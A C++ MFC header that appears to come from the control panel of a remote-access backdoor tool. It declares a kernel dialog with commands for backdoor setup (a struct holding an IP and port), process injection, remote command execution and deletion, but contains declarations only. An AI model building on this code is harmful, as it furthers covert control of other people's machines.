#pragma once

// CKernelDlg 对话框
enum
{
	COMMAND_KERNEL_INIT,
	COMMAND_KERNEL_GETSTATE,
	COMMAND_KERNEL_SETSTATE_CONTINUE,
	COMMAND_KERNEL_SETSTATE_PROCESS,
	COMMAND_KERNEL_SETSTATE_STOP,
	COMMAND_KERNEL_RUNCOMMAND,
	COMMAND_KERNEL_DELCOMMAND,
	COMMAND_KERNEL_WRITERCOMMAND,
	COMMAND_KERNEL_BACKDOOR,

	COMMAND_KERNEL_DEL,
	COMMAND_KERNEL_INJECT,

	TOKEN_KERNEL_RETURNINFO,
};

enum
{
	INITSUC,
	INITUNSUC,
	COMMANDERROR,
};

struct BACKDOOR
{
	BYTE Token;
	TCHAR ip[255];
	TCHAR port[30];
};


struct RETURNINFO
{
	BYTE Token;
	BYTE mode;
	TCHAR info[1024];
};

struct RUNCOMMAND
{
	BYTE Token;
	int  argc;
	TCHAR Command[1024];
};

class CKernelDlg : public CXTPResizeDialog
{

	//DECLARE_DYNAMIC(CKeyBoardDlg)

public:
	CKernelDlg(CWnd* pParent = NULL, ISocketBase* IOCPServer = NULL, ClientContext* ContextObject = NULL);   // 标准构造函数
//	virtual ~CKeyBoardDlg();
	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	HICON          m_hIcon;
	void OnReceiveComplete(void);
	void OnReceive();
	// 对话框数据
	enum {IDD = IDD_KERNEL	};

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持
	virtual void PostNcDestroy();
	virtual void OnCancel();
	DECLARE_MESSAGE_MAP()
public:
	BOOL m_bOnClose;

	virtual BOOL OnInitDialog();
	//afx_msg void OnClose();





	afx_msg void OnBnClickedButtoninit();
	afx_msg void OnBnClickedButtonGetstate();
	afx_msg void OnBnClickedButtonSetstateopen();
	afx_msg void OnBnClickedButtonSetstateclose();
	afx_msg void OnBnClickedButtonRuncommand();
	CComboBox m_combo_main;
	
	afx_msg void OnBnClickedButtonDelcommand();
	CEdit m_edit_result;
	afx_msg void OnBnClickedButtonWritercommand();
	afx_msg void OnBnClickedButtonDel();
	afx_msg void OnBnClickedButtonSetstateprocess();
	afx_msg void OnBnClickedButtonInject();
};





